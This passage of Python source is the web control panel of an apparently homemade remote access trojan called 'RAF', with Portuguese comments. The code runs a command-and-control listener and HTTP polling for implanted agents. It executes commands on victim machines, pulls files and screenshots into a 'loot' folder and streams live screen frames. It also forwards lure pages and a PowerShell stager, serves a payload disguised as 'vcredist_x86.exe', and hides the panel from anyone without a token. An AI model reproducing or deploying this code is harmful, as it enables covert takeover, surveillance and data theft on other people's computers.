setInterval(refresh, 2000);
</script></body></html>
"""


class HttpRegistry:
    """Agents that reach us over HTTP polling instead of a raw TCP socket."""

    def __init__(self, key):
        self.key = key
        self.sessions = {}
        self.lock = threading.Lock()

    def touch(self, sid, addr, info=None):
        with self.lock:
            s = self.sessions.get(sid)
            if s is None:
                s = S.HttpSession(sid, addr, self.key)
                self.sessions[sid] = s
                print("[+] http session %s from %s" % (sid, addr))
            if info:
                s.info = info
            s.alive = True
            s.last_seen = time.time()
            return s

    def get(self, sid):
        with self.lock:
            return self.sessions.get(sid)

    def all(self):
        with self.lock:
            out = list(self.sessions.values())
        return [s for s in out if s.check()]


class App:
    def __init__(self, c2_host, c2_port, key, web_port, token=None, deliver_port=8888):
        self.key = key
        self.web_port = web_port
        self.token = token
        self.deliver_port = deliver_port
        self.c2 = S.Server(c2_host, c2_port, key)
        self.c2_port = c2_port
        self.http = HttpRegistry(key)
        self.agent = None
        os.makedirs(LOOT, exist_ok=True)

    def sessions(self):
        out = []
        for s in self.c2.all() + self.http.all():
            i = s.info or {}
            if isinstance(s.addr, tuple):
                addr = "%s:%d" % (s.addr[0], s.addr[1])
            else:
                addr = str(s.addr)
            out.append({
                "id": s.id, "addr": addr,
                "host": i.get("host", "?"), "user": i.get("user", "?"),
                "os": i.get("os", "?"), "admin": bool(i.get("admin")),
                "alive": s.alive, "ip": i.get("ip", "?"),
                "seen": int(max(0, time.time() - getattr(s, "last_seen", time.time()))),
                "transport": getattr(s, "transport", "tcp"),
            })
        return out

    def spawn_agent(self):
        self.agent = subprocess.Popen(
            [sys.executable, os.path.join(HERE, "agent.py"),
             "--host", "127.0.0.1", "--port", str(self.c2_port),
             "--key", self.key.decode() if isinstance(self.key, bytes) else self.key],
            cwd=HERE,
            stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            creationflags=0x00000008,      # DETACHED_PROCESS: no console window
        )
        return self.agent.pid

    def execute(self, sid, op, args):
        sess = self.c2.get(sid) or self.http.get(sid)
        if not sess or not sess.alive:
            return {"ok": False, "out": "session unavailable"}
        if getattr(sess, "transport", "") == "http":
            # o agente faz long-poll de 20s: mais de 25s sem contato = sumiu.
            # Sem isso o painel enfileirava o comando e travava 5 min a toa.
            age = time.time() - getattr(sess, "last_seen", 0)
            if age > 25:
                return {"ok": False,
                        "out": "agente offline (ultimo contato %ds atras)" % int(age)}
        try:
            if op in ("download", "screenshot"):
                res, data = sess.request(op, args or {}, timeout=300)
                if not res.get("ok"):
                    return {"ok": False, "out": res.get("out", "")}
                name = res.get("file") or ("shot.bmp" if op == "screenshot" else "file.bin")
                name = os.path.basename(name) or "file.bin"
                path = os.path.join(LOOT, "%s_%s" % (sess.id, name))
                with open(path, "wb") as f:
                    f.write(data)
                return {"ok": True, "out": "%s (%d bytes)" % (res.get("out", ""), len(data)),
                        "url": "/loot/" + os.path.basename(path)}

            if op == "upload":
                blob = base64.b64decode(args.get("data_b64", ""))
                fd, tmp = tempfile.mkstemp(prefix="raf_up_")
                with os.fdopen(fd, "wb") as f:
                    f.write(blob)
                try:
                    res, _ = sess.push(tmp, args.get("path", "upload.bin"), timeout=600)
                finally:
                    try:
                        os.remove(tmp)
                    except OSError:
                        pass
                return {"ok": bool(res.get("ok")), "out": res.get("out", "")}

            res, _ = sess.request(op, args or {}, timeout=300)
            return {"ok": bool(res.get("ok", True)), "out": res.get("out", "")}
        except TimeoutError:
            return {"ok": False, "out": "timeout -- agent busy or gone"}
        except Exception as exc:
            return {"ok": False, "out": str(exc)}


class Handler(BaseHTTPRequestHandler):
    app = None
    protocol_version = "HTTP/1.1"

    def log_message(self, *a):
        pass

    def _authed(self):
        if not self.app.token:
            return True
        if self.headers.get("X-Token") == self.app.token:
            return True
        q = parse_qs(urlparse(self.path).query)
        if q.get("t", [None])[0] == self.app.token:
            return True
        return self._cookie_token() == self.app.token

    def _local(self):
        """127.0.0.1 so conta como local quando NAO veio por tunel/proxy."""
        if os.environ.get("RAF_TRUST_LOCAL") == "0":
            return False
        if self.client_address[0] not in ("127.0.0.1", "::1"):
            return False
        for h in ("CF-Connecting-IP", "CF-Ray", "X-Forwarded-For", "X-Real-IP"):
            if self.headers.get(h):
                return False
        return True

    def _cookie_token(self):
        raw = self.headers.get("Cookie") or ""
        for part in raw.split(";"):
            k, _, v = part.strip().partition("=")
            if k == "raf_token":
                return v
        return None

    def _set_cookie_header(self, gave_token_in_url):
        """Trust localhost, and remember the token once it was typed once."""
        if not self.app.token:
            return None
        local = self._local()
        if not (local or gave_token_in_url):
            return None
        if self._cookie_token() == self.app.token:
            return None
        return "raf_token=%s; Path=/; SameSite=Strict; Max-Age=2592000" % self.app.token

    def _send(self, code, body, ctype="application/json", extra=None):
        if isinstance(body, str):
            body = body.encode("utf-8")
        self.send_response(code)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Cache-Control", "no-store")
        for k, v in (extra or {}).items():
            self.send_header(k, v)
        self.end_headers()
        self.wfile.write(body)

    def _json(self, obj, code=200):
        self._send(code, json.dumps(obj))

    def _frame(self, sid, width=1280, quality=55):
        sess = (self.app.c2.get(sid) or self.app.http.get(sid)) if sid else None
        if not sess or not sess.alive:
            return self._json({"ok": False, "out": "session unavailable"}, 404)
        try:
            res, data = sess.request("frame", {"width": width, "quality": quality},
                                     timeout=15)
        except Exception as exc:
            return self._json({"ok": False, "out": str(exc)}, 500)
        if not res.get("ok"):
            return self._json({"ok": False, "out": res.get("out", "no frame")}, 500)
        if not data and res.get("b64") and res.get("out"):
            # agente mandou o jpeg embutido em base64 em vez de chunks
            try:
                data = base64.b64decode(res.get("out") or "")
            except Exception:
                data = b""
        if not data:
            return self._json({"ok": False, "out": "no frame"}, 500)
        return self._send(200, data, "image/jpeg")

    def _lure(self):
        """Encaminha a isca (pagina, download, stager) para o servidor de entrega."""
        import urllib.error
        import urllib.request
        url = "http://127.0.0.1:%d%s" % (self.app.deliver_port, self.path)
        hdr = {
            "User-Agent": self.headers.get("User-Agent", ""),
            "X-Forwarded-For": self.headers.get("CF-Connecting-IP")
                               or self.client_address[0],
        }
        if self.headers.get("Host"):
            hdr["Host"] = self.headers["Host"]
        if self.headers.get("Referer"):
            hdr["Referer"] = self.headers["Referer"]
        try:
            with urllib.request.urlopen(
                    urllib.request.Request(url, headers=hdr), timeout=180) as r:
                extra = {}
                cd = r.headers.get("Content-Disposition")
                if cd:
                    extra["Content-Disposition"] = cd
                return self._send(r.status, r.read(),
                                  r.headers.get("Content-Type") or "application/octet-stream",
                                  extra)
        except urllib.error.HTTPError as e:
            return self._send(e.code, e.read() or b"",
                              e.headers.get("Content-Type") or "text/plain")
        except Exception:
            return self._json({"ok": False, "out": "isca offline"}, 502)

    def do_GET(self):
        path = urlparse(self.path).path
        if path in ("/i", "/download", "/s.ps1", "/1") or path.startswith("/d/"):
            return self._lure()
        if path == "/":
            gave = parse_qs(urlparse(self.path).query).get("t", [None])[0] == self.app.token
            # fora do link nao existe painel: quem nao tem o token ve 404
            if self.app.token and not self._authed() and not self._local():
                return self._send(404, "Not Found", "text/plain; charset=utf-8")
            cookie = self._set_cookie_header(gave)
            extra = {"Set-Cookie": cookie} if cookie else None
            return self._send(200, PAGE, "text/html; charset=utf-8", extra)
        if not self._authed():
            return self._send(404, "Not Found", "text/plain; charset=utf-8")
        if path == "/api/sessions":
            return self._json({"sessions": self.app.sessions()})
        if path == "/api/frame":
            q = parse_qs(urlparse(self.path).query)
            try:
                w = int(q.get("w", ["1280"])[0])
            except ValueError:
                w = 1280
            try:
                qq = int(q.get("q", ["55"])[0])
            except ValueError:
                qq = 55
            return self._frame(q.get("sid", [None])[0],
                               max(240, min(w, 1920)), max(10, min(qq, 90)))
        if path == "/exe":
            # o painel tambem entrega o payload: daqui voce leva o exe pro outro PC
            full = getattr(self.app, "exe_path", "")
            if not full or not os.path.isfile(full):
                return self._json({"ok": False, "out": "exe nao encontrado"}, 404)
            with open(full, "rb") as f:
                data = f.read()
            name = os.path.basename(full)
            return self._send(200, data, "application/octet-stream",
                              {"Content-Disposition": 'attachment; filename="%s"' % name})
        if path.startswith("/loot/"):
            name = os.path.basename(path[len("/loot/"):])
            full = os.path.join(LOOT, name)
            if not os.path.isfile(full):
                return self._json({"ok": False, "out": "not found"}, 404)
            ext = os.path.splitext(name)[1].lower()
            ctype = {".bmp": "image/bmp", ".png": "image/png", ".jpg": "image/jpeg",
                     ".jpeg": "image/jpeg", ".gif": "image/gif",
                     ".txt": "text/plain; charset=utf-8",
                     ".json": "application/json"}.get(ext, "application/octet-stream")
            with open(full, "rb") as f:
                return self._send(200, f.read(), ctype)
        self._json({"ok": False, "out": "not found"}, 404)

    def do_POST(self):
        path = urlparse(self.path).path
        try:
            n = int(self.headers.get("Content-Length", 0) or 0)
        except ValueError:
            n = 0
        raw = self.rfile.read(n) if n else b""

        if path in ("/c2/poll", "/c2/result"):
            return self._c2(path, raw)

        if not self._authed():
            return self._send(404, "Not Found", "text/plain; charset=utf-8")
        try:
            body = json.loads(raw or b"{}")
        except Exception:
            body = {}

        if path == "/api/exec":
            return self._json(self.app.execute(body.get("sid"), body.get("op"), body.get("args") or {}))
        if path == "/api/upload":
            return self._json(self.app.execute(body.get("sid"), "upload", body))
        if path == "/api/agent":
            pid = self.app.spawn_agent()
            return self._json({"ok": True, "pid": pid, "out": "agent spawned (pid %d)" % pid})
        self._json({"ok": False, "out": "not found"}, 404)

    # ------------------------------------------------------------ http agents
    def _c2(self, path, raw):
        app = self.app
        want = hmac.new(app.key, raw, hashlib.sha256).hexdigest()
        got = self.headers.get("X-Sig", "")
        if not hmac.compare_digest(want, got):
            return self._json({"ok": False, "out": "bad signature"}, 403)
        try:
            body = json.loads(raw or b"{}")
        except Exception:
            return self._json({"ok": False, "out": "bad json"}, 400)

        sid = body.get("sid") or ""
        if not sid or len(sid) > 32:
            return self._json({"ok": False, "out": "bad sid"}, 400)

        addr = (self.headers.get("CF-Connecting-IP")
                or self.headers.get("X-Real-IP")
                or self.headers.get("X-Forwarded-For")
                or self.client_address[0])

        if path == "/c2/poll":
            s = app.http.touch(sid, addr, body.get("info"))
            return self._json({"cmds": s.poll(timeout=20)})

        app.http.touch(sid, addr)
        s = app.http.get(sid)
        if s is not None:
            s.deliver(body.get("id"), body.get("msgs") or [])
        return self._json({"ok": True})


def main():
    ap = argparse.ArgumentParser(description="RAF web console")
    ap.add_argument("--c2-host", default="0.0.0.0", help="agent-facing bind address")
    ap.add_argument("--c2-port", type=int, default=4444)
    ap.add_argument("--port", type=int, default=8080, help="web panel port")
    ap.add_argument("--key", default=S.DEFAULT_KEY)
    ap.add_argument("--token", default=None, help="require ?t=<token> or X-Token header")
    ap.add_argument("--deliver-port", type=int, default=8888,
                    help="porta local da isca (pagina/download) repassada pelo painel")
    ap.add_argument("--agent", action="store_true", help="spawn a local agent on start")
    ap.add_argument("--exe", default=os.path.join(HERE, "dist", "vcredist_x86.exe"),
                    help="arquivo servido em /exe (o payload do alvo)")
    a = ap.parse_args()

    S._harden_console()
    app = App(a.c2_host, a.c2_port, a.key.encode(), a.port, a.token, a.deliver_port)
    app.exe_path = a.exe
    try:
        app.c2.start()
    except OSError as exc:
        print("[!] cannot bind C2 port %d -- %s" % (a.c2_port, exc))
        return 1

    Handler.app = app
    try:
        httpd = ThreadingHTTPServer(("0.0.0.0", a.port), Handler)
    except OSError as exc:
        print("[!] cannot bind web port %d -- %s" % (a.port, exc))
        return 1

    print("C2 listener : %s:%d" % (a.c2_host, a.c2_port))
    print("web panel   : http://127.0.0.1:%d%s" % (a.port, "?t=" + a.token if a.token else ""))
    if a.agent:
        pid = app.spawn_agent()
        print("agent       : spawned (pid %d)" % pid)

    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        pass
    finally:
        httpd.server_close()
        if app.agent:
            try:
                app.agent.kill()
            except Exception:
                pass
        for s in app.c2.all():
            s.close()
    return 0


if __name__ == "__main__":
    sys.exit(main())
